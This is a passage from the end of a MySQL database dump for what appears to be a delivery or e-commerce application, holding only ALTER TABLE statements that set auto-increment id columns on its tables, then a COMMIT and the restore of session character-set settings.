  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `pkg_category`
--
ALTER TABLE `pkg_category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `pkg_order`
--
ALTER TABLE `pkg_order`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `rider`
--
ALTER TABLE `rider`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `setting`
--
ALTER TABLE `setting`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `tbl_address`
--
ALTER TABLE `tbl_address`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_cash`
--
ALTER TABLE `tbl_cash`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_code`
--
ALTER TABLE `tbl_code`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_coupon`
--
ALTER TABLE `tbl_coupon`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_faq`
--
ALTER TABLE `tbl_faq`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_happy_user`
--
ALTER TABLE `tbl_happy_user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_home_section`
--
ALTER TABLE `tbl_home_section`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_include`
--
ALTER TABLE `tbl_include`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `tbl_notification`
--
ALTER TABLE `tbl_notification`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_order`
--
ALTER TABLE `tbl_order`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_order_product`
--
ALTER TABLE `tbl_order_product`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_payment_list`
--
ALTER TABLE `tbl_payment_list`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT for table `tbl_pincode`
--
ALTER TABLE `tbl_pincode`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `tbl_product`
--
ALTER TABLE `tbl_product`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_product_attribute`
--
ALTER TABLE `tbl_product_attribute`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_rnoti`
--
ALTER TABLE `tbl_rnoti`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_snoti`
--
ALTER TABLE `tbl_snoti`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `tbl_user`
--
ALTER TABLE `tbl_user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `timeslot`
--
ALTER TABLE `timeslot`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `vendor`
--
ALTER TABLE `vendor`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wallet_report`
--
ALTER TABLE `wallet_report`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
